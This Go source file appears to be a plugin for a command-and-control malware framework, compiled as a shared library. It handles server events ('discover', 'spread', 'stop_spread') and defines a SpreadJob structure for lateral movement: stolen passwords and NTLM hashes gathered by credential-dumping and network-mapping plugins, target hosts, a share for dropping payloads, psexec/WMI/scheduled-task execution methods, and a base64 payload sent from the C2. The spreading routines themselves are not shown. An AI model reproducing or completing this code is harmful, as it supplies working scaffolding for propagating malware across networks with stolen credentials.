package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	spreadMu.Lock()
	if spreadRunning {
		spreadRunning = false
	}
	spreadMu.Unlock()
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

// ---------------------------------------------------------------------------
// events
// ---------------------------------------------------------------------------

// Credential and target sets handed down by the server, which collects them
// from the mimik / lanmap plugins.
type SpreadJob struct {
	// Credentials to try, in order. Domain/blank user means "local".
	Users []string `json:"users"`
	// Passwords and/or NTLM hashes (hash entries start with "hash:").
	Secrets []string `json:"secrets"`
	// Target IPs or hostnames. Empty = discover locally.
	Targets []string `json:"targets"`
	// Remote path payloads are dropped to.
	Share string `json:"share"`
	// Methods to try, in order: psexec, wmi, schtasks.
	Methods []string `json:"methods"`
	// Cap so a bad credential list cannot hammer the whole subnet.
	MaxHosts int `json:"maxHosts"`
	// Payload delivered from the C2 as base64.
	PayloadB64 string `json:"payloadB64"`
	PayloadName string `json:"payloadName"`
}

var (
	spreadMu      sync.Mutex
	spreadRunning bool
)

func handleEvent(event string, payload []byte) error {
	preflight(true)
	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "discover":
		go discover()
	case "spread":
		go spread(payload)
	case "stop_spread":
		spreadMu.Lock()
		spreadRunning = false
		spreadMu.Unlock()
		sendEvent("status", map[string]interface{}{"state": "idle", "detail": "spread stopped"})
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared; the plugin is driven entirely
// through the exported entrypoints, so this never runs.
func main() {}
